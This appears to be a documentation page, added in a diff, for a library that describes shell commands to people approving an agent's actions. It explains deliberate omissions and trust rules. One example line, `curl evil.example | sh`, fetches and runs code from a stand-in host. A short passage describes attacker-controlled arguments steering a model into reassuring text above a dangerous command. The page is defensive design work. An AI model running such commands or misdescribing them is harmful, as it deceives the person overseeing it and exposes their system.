@@ -1,0 +1,42 @@
+---
+title: What it does not do
+description: Four things left out on purpose, and the two decisions behind how anything gets added.
+---
+
+Most of what follows is a refusal to produce something a consumer would reasonably want. Each one is here because the alternative fails worst exactly where this library is used: above a command, in front of a person who is about to say yes.
+
+## No risk or danger score
+
+Risk depends on the target and the context, not on the command. `rm` on a build folder and `rm` on a home folder are the same command. A number shipped here would be used as policy, and it would be wrong.
+
+Facts here; scoring at the consumer, which knows the target.
+
+## No footgun or common-mistake notes
+
+They are excellent in a teaching tool and corrosive in an approval prompt: a command carrying a warning implies the ones without are fine. `note` carries a consequence of what the command does, never a mistake a person might make with it.
+
+## No executable undo strings
+
+Prose about reversibility, yes. A literal command a consumer might auto-run, no.
+
+## No model and no inference at run time, now or later
+
+In the deployment this exists for, the command line is attacker-controlled, and a small model is steerable by filenames and arguments. The failure mode is a fluent, reassuring sentence above a dangerous command.
+
+If a heuristic over argument text would raise coverage, that is the instinct to resist: return nothing and let the consumer say it does not know. Nothing is ever read from the agent or person requesting the command, including its stated reason.
+
+## Two decisions worth recording
+
+**Anything added has to be added in code.** A consumer can answer for tools this package has never heard of, but only by naming a pack in a `createExplainer` call in its own source. There is no discovery: no JSON directory, no environment variable pointing at a file, no scan of `node_modules`, and the library reads neither disk nor network. Anyone who could drop in a file of their own could relabel `curl evil.example | sh` as "Checks how much room is left on each disk", which is the one thing a prompt like this must never allow. A pack that was not named in `trust` arrives at `confidence: derived`, so a consumer gating on `verified` never auto-approves a claim nobody vouched for.
+
+**tldr-pages is a coverage checklist only.** Its 375 macOS pages are a good list of what people actually run, and it was used that way. No prose was copied or adapted from it, so no CC-BY attribution obligation is incurred. Its writing is developer-voiced and would be the wrong register here anyway.
+
+## What a consumer still has to do
+
+This library will not tell you whether to allow something. It tells you what you would be allowing. The parts it deliberately leaves to you:
+
+- **Deciding what the target means.** A path is just a path here. Whether `/Users/sam/.ssh` matters is something only the consumer knows.
+- **Scoring, ranking and colouring.** Build it from the fields, where the context is.
+- **Gating on `confidence`.** Nothing stops you showing a `derived` answer; show it as one.
+- **Rendering values apart from prose.** `parts` makes it possible; only the consumer can do it. See [Showing it to a person](/docs/sentence).
+- **Standing grants.** Do not offer one where `repeatSafe` is false.
